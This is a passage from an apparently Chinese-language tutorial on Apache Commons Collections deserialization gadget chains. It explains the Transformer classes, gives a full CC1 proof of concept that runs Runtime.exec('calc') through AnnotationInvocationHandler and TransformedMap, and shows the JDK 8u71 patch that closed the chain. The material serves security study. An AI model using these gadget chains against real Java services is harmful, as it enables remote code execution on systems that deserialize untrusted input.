后面的回调 <code>transform</code> 方法，就是执行了 <code>input</code> 对象的 <code>iMethodName</code> 方法，并传入 <code>iArgs</code> 参数，即 <code>input.iMethod(iArgs)</code>。<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var4) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException var6) &#123;</span><br><span class="line">            <span class="type">InvocationTargetException</span> <span class="variable">ex</span> <span class="operator">=</span> var6;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h4 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h4><p><code>InstantiateTransformer</code> 会把传入的 <code>input</code> 看做是一个 <code>Class</code> 对象，然后调用其对应的构造函数并传入指定参数来实例化一个对象。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InstantiateTransformer</span><span class="params">(Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iParamTypes = paramTypes;</span><br><span class="line">    iArgs = args;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input <span class="keyword">instanceof</span> Class == <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(</span><br><span class="line">                <span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span></span><br><span class="line">                    + (input == <span class="literal">null</span> ? <span class="string">&quot;null object&quot;</span> : input.getClass().getName()));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> ((Class) input).getConstructor(iParamTypes);</span><br><span class="line">        <span class="keyword">return</span> con.newInstance(iArgs);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: The constructor must exist and be public &quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InstantiationException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: InstantiationException&quot;</span>, ex);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: Constructor must be public&quot;</span>, ex);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: Constructor threw an exception&quot;</span>, ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><p><code>ChainedTransformer</code> 也是实现了 <code>Transformer</code> 接口的一个类，它的作用是将内部的多个 <code>Transformer</code> 串在一起。通俗来说就是，前一个回调返回的结果，作为后一个回调的参数传入。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = <span class="built_in">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="Transformer-构造代码执行流"><a href="#Transformer-构造代码执行流" class="headerlink" title="Transformer 构造代码执行流"></a>Transformer 构造代码执行流</h3><h4 id="构造任意代码执行"><a href="#构造任意代码执行" class="headerlink" title="构造任意代码执行"></a>构造任意代码执行</h4><p>根据前面对 <code>Transformer</code> 的介绍，我们可以将 <code>Runtime.getRuntime().exec(&quot;calc&quot;)</code> 拆解为 <code>runtime = Runtime.getRuntime()</code> 和 <code>runtime.exec(&quot;calc&quot;)</code> 两部分，因而有如下构造：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">transformerChain.transform(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure></div>
<p>然而由于 <code>Runtime</code> 对象没有实现 <code>Serializable</code> 接口，因此 <code>transformerChain</code> 对象是无法序列化的，因此我们还要把 <code>Runtime.getRuntime()</code> 拆解为 <code>getRuntime = Runtime.class.getMethod(&quot;getRuntime&quot;)</code> 和 <code>getRuntime.invoke(null)</code>。</p>
<p>由于 <code>InvokerTransformer</code> 内部会对传入的方法调用 <code>getMethod</code> 查找，因此构造 <code>InvokerTransformer</code> 时传入的参数类型需要严格按照传入的方法名对应的方法的定义来，且参数要和参数类型数量严格对应，这就是为什么实际上我们构造的是 <code>Runtime.class.getMethod(&quot;getRuntime&quot;, null)</code> 和 <code>getRuntime.invoke(null, null)</code> 。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">transformerChain.transform(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure></div>
<h4 id="构造任意字节码加载"><a href="#构造任意字节码加载" class="headerlink" title="构造任意字节码加载"></a>构造任意字节码加载</h4><p><code>TemplatesImpl</code> 加载任意字节码有如下调用栈：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">defineClass:142, TemplatesImpl$TransletClassLoader (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">defineTransletClasses:346, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getTransletInstance:383, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:418, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getOutputProperties:439, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">main:34, DefineClassExample (com.example)</span><br></pre></td></tr></table></figure></div>
<p>因此我们只需要想办法让程序执行流程能够到达这个调用栈中任意一个函数即可，例如 <code>newTransformer</code>。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> createTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(obj),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">transformerChain.transform(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure></div>
<h2 id="相关利用链"><a href="#相关利用链" class="headerlink" title="相关利用链"></a>相关利用链</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/5a4d01c1d0904b5c8444ceaa2cf42198.png"
                      alt="在这里插入图片描述"
                ></p>
<h3 id="CommonsCollections0（AnnotationInvocationHandler→TransformedMap）"><a href="#CommonsCollections0（AnnotationInvocationHandler→TransformedMap）" class="headerlink" title="CommonsCollections0（AnnotationInvocationHandler→TransformedMap）"></a>CommonsCollections0（AnnotationInvocationHandler→TransformedMap）</h3><p><code>sun.reflect.annotation.AnnotationInvocationHandler</code> 的 <code>readObject</code> 中的 <code> memberValue.setValue</code> 会调用 <code>setValue</code> 方法，进而会调用到 <code>memberValues</code> 的 <code>transformer</code> 方法。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">        <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            annotationType = AnnotationType.getInstance(type);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">        <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                      value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    memberValue.setValue(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                            value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                                annotationType.members().get(name)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>不过这里需要绕过 <code>memberType != null</code> 判断，根据调试可知 <code>memberTypes</code> 中的 <code>key</code> 是构造时传入的 <code>type</code> 对应的类中的所有方法名字符串，而 <code>name</code> 是构造时传入的 <code>memberValues</code> 中的某个 <code>key</code>。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">    Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">    <span class="keyword">if</span> (!type.isAnnotation() ||</span><br><span class="line">        superInterfaces.length != <span class="number">1</span> ||</span><br><span class="line">        superInterfaces[<span class="number">0</span>] != java.lang.annotation.Annotation.class)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">    <span class="built_in">this</span>.type = type;</span><br><span class="line">    <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>又因为 <code>type</code> 还要继承自 <code>Annotation</code>，因此因此我构造的时候 <code>type</code> 选择 <code>Retention.class</code> ，这样 <code>memberTypes</code> 中的键就有一个 <code>value</code> 字符串，此时我们预先在 <code>memberValues</code> 中存一个 <code>value</code> 字符串的键就可以执行到 <code>setValue</code> 方法。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Target(ElementType.ANNOTATION_TYPE)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Retention &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Returns the retention policy.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the retention policy</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    RetentionPolicy <span class="title function_">value</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>完整 poc 如下：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;sky&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(handler);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>调用栈如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">transform:122, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">checkSetValue:204, TransformedMap (org.apache.commons.collections.map)</span><br><span class="line">setValue:192, AbstractInputCheckedMapDecorator$MapEntry (org.apache.commons.collections.map)</span><br><span class="line">readObject:356, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">...</span><br><span class="line">main:36, CommonsCollections1 (com.example)</span><br></pre></td></tr></table></figure></div>
<p>在 8u71 以后大概是 2015 年 12 月的时候，Java 官方<a class="link"   href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/f8a528d0379d" >修改 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>了 <code>sun.reflect.annotation.AnnotationInvocationHandler</code> 的 <code>readObject</code> 函数。新版的 <code>readObject</code> 不再操作 <code>memberValues</code> 而是操作 <code>Map&lt;String, Object&gt; streamVals = (Map&lt;String, Object&gt;)fields.get(&quot;memberValues&quot;, null)</code> ，因此 CC1 失效。</p>
<div class="highlight-container" data-rel="Diff"><figure class="iseeu highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="comment">--- a/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java	Tue Dec 01 08:58:28 2015 -0500</span></span><br><span class="line"><span class="comment">+++ b/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java	Tue Dec 01 22:38:16 2015 +0000</span></span><br><span class="line"><span class="meta">@@ -25,6 +25,7 @@</span></span><br><span class="line"> </span><br><span class="line"> package sun.reflect.annotation;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+import java.io.ObjectInputStream;</span></span><br><span class="line"> import java.lang.annotation.*;</span><br><span class="line"> import java.lang.reflect.*;</span><br><span class="line"> import java.io.Serializable;</span><br><span class="line"><span class="meta">@@ -425,35 +426,72 @@</span></span><br><span class="line"> </span><br><span class="line">     private void readObject(java.io.ObjectInputStream s)</span><br><span class="line">         throws java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line"><span class="deletion">-        s.defaultReadObject();</span></span><br><span class="line"><span class="addition">+        ObjectInputStream.GetField fields = s.readFields();</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+        @SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line"><span class="addition">+        Class&lt;? extends Annotation&gt; t = (Class&lt;? extends Annotation&gt;)fields.get(&quot;type&quot;, null);</span></span><br><span class="line"><span class="addition">+        @SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line"><span class="addition">+        Map&lt;String, Object&gt; streamVals = (Map&lt;String, Object&gt;)fields.get(&quot;memberValues&quot;, null);</span></span><br><span class="line"> </span><br><span class="line">         // Check to make sure that types have not evolved incompatibly</span><br><span class="line"> </span><br><span class="line">         AnnotationType annotationType = null;</span><br><span class="line">         try &#123;</span><br><span class="line"><span class="deletion">-            annotationType = AnnotationType.getInstance(type);</span></span><br><span class="line"><span class="addition">+            annotationType = AnnotationType.getInstance(t);</span></span><br><span class="line">         &#125; catch(IllegalArgumentException e) &#123;</span><br><span class="line">             // Class is no longer an annotation type; time to punch out</span><br><span class="line">             throw new java.io.InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);</span><br><span class="line">         &#125;</span><br><span class="line"> </span><br><span class="line">         Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"><span class="addition">+        // consistent with runtime Map type</span></span><br><span class="line"><span class="addition">+        Map&lt;String, Object&gt; mv = new LinkedHashMap&lt;&gt;();</span></span><br><span class="line"> </span><br><span class="line">         // If there are annotation members without values, that</span><br><span class="line">         // situation is handled by the invoke method.</span><br><span class="line"><span class="deletion">-        for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span></span><br><span class="line"><span class="addition">+        for (Map.Entry&lt;String, Object&gt; memberValue : streamVals.entrySet()) &#123;</span></span><br><span class="line">             String name = memberValue.getKey();</span><br><span class="line"><span class="addition">+            Object value = null;</span></span><br><span class="line">             Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">             if (memberType != null) &#123;  // i.e. member still exists</span><br><span class="line"><span class="deletion">-                Object value = memberValue.getValue();</span></span><br><span class="line"><span class="addition">+                value = memberValue.getValue();</span></span><br><span class="line">                 if (!(memberType.isInstance(value) ||</span><br><span class="line">                       value instanceof ExceptionProxy)) &#123;</span><br><span class="line"><span class="deletion">-                    memberValue.setValue(</span></span><br><span class="line"><span class="deletion">-                        new AnnotationTypeMismatchExceptionProxy(</span></span><br><span class="line"><span class="addition">+                    value = new AnnotationTypeMismatchExceptionProxy(</span></span><br><span class="line">                             value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(</span><br><span class="line"><span class="deletion">-                                annotationType.members().get(name)));</span></span><br><span class="line"><span class="addition">+                                annotationType.members().get(name));</span></span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;</span><br><span class="line"><span class="addition">+            mv.put(name, value);</span></span><br><span class="line"><span class="addition">+        &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+        UnsafeAccessor.setType(this, t);</span></span><br><span class="line"><span class="addition">+        UnsafeAccessor.setMemberValues(this, mv);</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+    private static class UnsafeAccessor &#123;</span></span><br><span class="line"><span class="addition">+        private static final sun.misc.Unsafe unsafe;</span></span><br><span class="line"><span class="addition">+        private static final long typeOffset;</span></span><br><span class="line"><span class="addition">+        private static final long memberValuesOffset;</span></span><br><span class="line"><span class="addition">+        static &#123;</span></span><br><span class="line"><span class="addition">+            try &#123;</span></span><br><span class="line"><span class="addition">+                unsafe = sun.misc.Unsafe.getUnsafe();</span></span><br><span class="line"><span class="addition">+                typeOffset = unsafe.objectFieldOffset</span></span><br><span class="line"><span class="addition">+                        (AnnotationInvocationHandler.class.getDeclaredField(&quot;type&quot;));</span></span><br><span class="line"><span class="addition">+                memberValuesOffset = unsafe.objectFieldOffset</span></span><br><span class="line"><span class="addition">+                        (AnnotationInvocationHandler.class.getDeclaredField(&quot;memberValues&quot;));</span></span><br><span class="line"><span class="addition">+            &#125; catch (Exception ex) &#123;</span></span><br><span class="line"><span class="addition">+                throw new ExceptionInInitializerError(ex);</span></span><br><span class="line"><span class="addition">+            &#125;</span></span><br><span class="line"><span class="addition">+        &#125;</span></span><br><span class="line"><span class="addition">+        static void setType(AnnotationInvocationHandler o,</span></span><br><span class="line"><span class="addition">+                            Class&lt;? extends Annotation&gt; type) &#123;</span></span><br><span class="line"><span class="addition">+            unsafe.putObject(o, typeOffset, type);</span></span><br><span class="line"><span class="addition">+        &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+        static void setMemberValues(AnnotationInvocationHandler o,</span></span><br><span class="line"><span class="addition">+                                    Map&lt;String, Object&gt; memberValues) &#123;</span></span><br><span class="line"><span class="addition">+            unsafe.putObject(o, memberValuesOffset, memberValues);</span></span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></div>

